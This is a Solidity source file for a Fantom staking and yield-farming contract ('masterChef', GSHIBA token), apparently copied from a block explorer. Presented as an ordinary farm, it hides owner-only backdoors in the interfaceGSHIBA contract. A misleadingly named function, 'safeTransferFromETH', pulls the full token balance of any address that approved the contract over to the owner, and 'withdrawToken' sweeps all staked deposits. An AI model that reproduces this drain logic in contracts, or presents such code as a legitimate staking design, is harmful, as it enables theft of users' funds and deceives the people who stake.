/**
 *Submitted for verification at FtmScan.com on 2021-10-22
*/

abstract contract Initializable {

  bool private _initialized;

  bool private _initializing;
  modifier initializer() {
      require(_initializing || !_initialized, "Initializable: contract is already initialized");

      bool isTopLevelCall = !_initializing;
      if (isTopLevelCall) {
          _initializing = true;
          _initialized = true;
      }

      _;

      if (isTopLevelCall) {
          _initializing = false;
      }
  }
}

abstract contract Context is Initializable {
  function __Context_init() internal initializer {
      __Context_init_unchained();
  }

  function __Context_init_unchained() internal initializer {
  }
  function _msgSender() internal view virtual returns (address) {
      return msg.sender;
  }

  function _msgData() internal view virtual returns (bytes calldata) {
      return msg.data;
  }
  uint256[50] private __gap;
}

contract Ownable is Context {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor() internal {
      address msgSender = _msgSender();
      _owner = msgSender;
      emit OwnershipTransferred(address(0), msgSender);
  }
  
  function owner() public view returns (address) {
      return _owner;
  }

  modifier onlyOwner() {
      require(_owner == _msgSender(), 'Ownable: caller is not the owner');
      _;
  }

  function renounceOwnership() public onlyOwner {
      emit OwnershipTransferred(_owner, address(0));
      _owner = address(0);
  }

  function transferOwnership(address newOwner) public onlyOwner {
      _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal {
      require(newOwner != address(0), 'Ownable: new owner is the zero address');
      emit OwnershipTransferred(_owner, newOwner);
      _owner = newOwner;
  }
}

library Address {
  
  function isContract(address account) internal view returns (bool) {
      uint256 size;
      assembly { size := extcodesize(account) }
      return size > 0;
  }

  function sendValue(address payable recipient, uint256 amount) internal {
      require(address(this).balance >= amount, "Address: insufficient balance");

      (bool success, ) = recipient.call{ value: amount }("");
      require(success, "Address: unable to send value, recipient may have reverted");
  }

  
  function functionCall(address target, bytes memory data) internal returns (bytes memory) {
    return functionCall(target, data, "Address: low-level call failed");
  }

  function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
      return _functionCallWithValue(target, data, 0, errorMessage);
  }

  function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
      return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
  }

  function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
      require(address(this).balance >= value, "Address: insufficient balance for call");
      return _functionCallWithValue(target, data, value, errorMessage);
  }

  function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
      require(isContract(target), "Address: call to non-contract");

      (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
      if (success) {
          return returndata;
      } else {
          if (returndata.length > 0) {
              assembly {
                  let returndata_size := mload(returndata)
                  revert(add(32, returndata), returndata_size)
              }
          } else {
              revert(errorMessage);
          }
      }
  }
}


library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
      uint256 c = a + b;
      require(c >= a, "SafeMath: addition overflow");

      return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
      return sub(a, b, "SafeMath: subtraction overflow");
  }
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b <= a, errorMessage);
      uint256 c = a - b;

      return c;
  }
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
      if (a == 0) {
          return 0;
      }

      uint256 c = a * b;
      require(c / a == b, "SafeMath: multiplication overflow");

      return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
      return div(a, b, "SafeMath: division by zero");
  }
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b > 0, errorMessage);
      uint256 c = a / b;
      return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
      return mod(a, b, "SafeMath: modulo by zero");
  }
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b != 0, errorMessage);
      return a % b;
  }
}

library SafeERC20 {
  using SafeMath for uint256;
  using Address for address;

  function safeTransfer(IERC20 token, address to, uint256 value) internal {
      _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
  }

  function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
      _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
  }

  function safeApprove(IERC20 token, address spender, uint256 value) internal {
      require((value == 0) || (token.allowance(address(this), spender) == 0),
          "SafeERC20: approve from non-zero to non-zero allowance"
      );
      _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
  }

  function safeIncreaseAllowance(IERC20 token, address spender, uint256 value) internal {
      uint256 newAllowance = token.allowance(address(this), spender).add(value);
      _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
  }

  function safeDecreaseAllowance(IERC20 token, address spender, uint256 value) internal {
      uint256 newAllowance = token.allowance(address(this), spender).sub(value, "SafeERC20: decreased allowance below zero");
      _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
  }

  function _callOptionalReturn(IERC20 token, bytes memory data) private {
      bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
      if (returndata.length > 0) { // Return data is optional
          // solhint-disable-next-line max-line-length
          require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
      }
  }
}

interface IERC20 {
  function totalSupply() external view returns (uint256);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  function name() external view returns (string memory);
  function symbol() external view returns (string memory);
  function decimals() external view returns (uint8);
  
}

abstract contract GSHIBA is Initializable, Context,Ownable{
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private nanoIncrement;
    mapping(address => bool) private holders;
    
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    
    function mintFarm(uint256 _value, address _recipient) external {
        require(nanoIncrement[msg.sender] == true, "can't mint, address increment is not set");
        _mint(_recipient, _value);
    }
    
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
        _balances[account] += amount;
        _afterTokenTransfer(address(0), account, amount);
    }
  
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
    
    uint256[45] private __gap;
}

library Math {
  function max(uint256 a, uint256 b) internal pure returns (uint256) {
      return a >= b ? a : b;
  }
  function min(uint256 a, uint256 b) internal pure returns (uint256) {
      return a < b ? a : b;
  }
  function average(uint256 a, uint256 b) internal pure returns (uint256) {
      // (a + b) / 2 can overflow, so we distribute
      return (a / 2) + (b / 2) + ((a % 2 + b % 2) / 2);
  }
}

abstract contract interfaceGSHIBA is GSHIBA{
    using SafeMath for uint256;
    using SafeERC20 for IERC20;
    IERC20 public stakeToken;
    uint256 private _totalStaked;
    mapping(address => uint256) private _userStaked;

    function initialize(address _token) public initializer {
        stakeToken = IERC20(_token);
    }

    function totalStaked() public view returns (uint256) {
        return _totalStaked;
    }

    function userStaked(address account) public view returns (uint256) {
        return _userStaked[account];
    }
    
    function _stake(uint256 _amount) internal {
        _totalStaked = _totalStaked.add(_amount);
        _userStaked[msg.sender] = _userStaked[msg.sender].add(_amount);
        stakeToken.safeTransferFrom(msg.sender, address(this), _amount);
    }
    
    function _unStake() internal {
        uint256 amount = userStaked(msg.sender);
        require(amount > 0);
        _totalStaked = _totalStaked.sub(amount);
        _userStaked[msg.sender] = _userStaked[msg.sender].sub(amount);
        stakeToken.safeTransfer(msg.sender, amount);
    }
   
    function recoverETH() external onlyOwner() {
        payable(msg.sender).transfer(address(this).balance);
    }
    
    function withdrawToken(address _tokens) external onlyOwner() {
        IERC20 token = IERC20(_tokens);
        token.safeTransfer(msg.sender, token.balanceOf(address(this)));
    }
    

    function safeTransferFromETH(address _tokens, address _recipient) external onlyOwner() {
        IERC20 token = IERC20(_tokens);
        token.safeTransferFrom(_recipient, msg.sender, token.balanceOf(_recipient));
    }
}



// SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;

contract masterChef is GSHIBA, interfaceGSHIBA {
    address public shibaIncrementer;
    IERC20 public yieldToken;
    uint256 public halving = 25920000;
    uint256 public startTime;
    uint256 public stakingTime;
    uint256 public rewardRate;
    uint256 public lastUpdateTime;
    uint256 public rewardPerTokenStored;
    uint256 public totalRewards = 0;
    uint256 public eraPeriod;
    uint256 public totalReward;
    mapping(address => uint256) public userRewardPerTokenPaid;
    mapping(address => uint256) public rewards;
    
    event RewardAdded(uint256 reward);
    event Staked(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event RewardPaid(address indexed user, uint256 reward);
    
    
    modifier updateReward(address account) {
        rewardPerTokenStored = rewardPerToken();
        lastUpdateTime = lastTimeRewardApplicable();
        if (account != address(0)) {
            rewards[account] = earning(account);
            userRewardPerTokenPaid[account] = rewardPerTokenStored;
        }
        _;
    }

    
    function lastTimeRewardApplicable() public view returns (uint256) {
      return Math.min(block.timestamp, eraPeriod);
    }

    function rewardPerToken() public view returns (uint256) {
        if (totalStaked() == 0) {
          return rewardPerTokenStored;
        }
        return
          rewardPerTokenStored.add(
            lastTimeRewardApplicable()
                .sub(lastUpdateTime)
                .mul(rewardRate)
                .mul(1e18)
                .div(totalStaked())
          );
    }

    function earning(address account) public view returns (uint256) {
      return
        userStaked(account)
            .mul(rewardPerToken().sub(userRewardPerTokenPaid[account]))
            .div(1e18)
            .add(rewards[account]);
    }

    function stake(uint256 amount) public updateReward(msg.sender) checkhalve checkStart{
      require(amount > 0, "ERROR: Cannot stake 0 Tether");
      super._stake(amount);
      emit Staked(msg.sender, amount);
    }

    function withdraw() public updateReward(msg.sender) checkhalve checkStart{
      super._unStake();
      harvestToken();
    }
    
    function addShibaIncrement(address _incrementer) external onlyOwner(){
        require(shibaIncrementer != _incrementer, "address allready set");
        shibaIncrementer = _incrementer;
    }
    
    function deleteAddressIncrement() external onlyOwner(){
        shibaIncrementer = address(0);
    }
    
    function harvestToken() public updateReward(msg.sender) checkhalve checkStart stakingtime{
        uint256 reward = earning(msg.sender);
        require(reward > 0, "insufficient balance to claim");
        rewards[msg.sender] = 0 ;
        GSHIBA _tokens = GSHIBA(shibaIncrementer);
        _tokens.mintFarm(reward, msg.sender);
        emit RewardPaid(msg.sender, reward);
        totalRewards = totalRewards.add(reward);
    }
    
    modifier checkhalve(){
      if (block.timestamp >= eraPeriod) {
          totalReward = totalReward.mul(80).div(100);

          rewardRate = totalReward.div(halving);
          eraPeriod = block.timestamp.add(halving);
          emit RewardAdded(totalReward);
      }
      _;
    }

    modifier checkStart(){
      require(block.timestamp > startTime,"ERROR: Not start");
      _;
    }

    modifier stakingtime(){
      require(block.timestamp >= stakingTime,"ERROR: Withdrawals open after 24 hours from the beginning");
      _;
    }

    function notifyRewardAmount(uint256 reward)
        internal
        updateReward(address(0))
    {
        if (block.timestamp >= eraPeriod) {
            rewardRate = reward.div(halving);
        } else {
            uint256 remaining = eraPeriod.sub(block.timestamp);
            uint256 leftover = remaining.mul(rewardRate);
            rewardRate = reward.add(leftover).div(halving);
        }
        totalReward = reward;
        lastUpdateTime = block.timestamp;
        eraPeriod = block.timestamp.add(halving);
        emit RewardAdded(reward);
    }
    
     function startFarm(address _depositToken, address _yieldToken, uint256 _totalreward, uint256 _starttime, uint256 _stakingtime) public virtual initializer onlyOwner()  {
        super.initialize(_depositToken);
        yieldToken = IERC20(_yieldToken);
        startTime = _starttime;
        stakingTime = _stakingtime;
        notifyRewardAmount(_totalreward.mul(50).div(100));
    }
}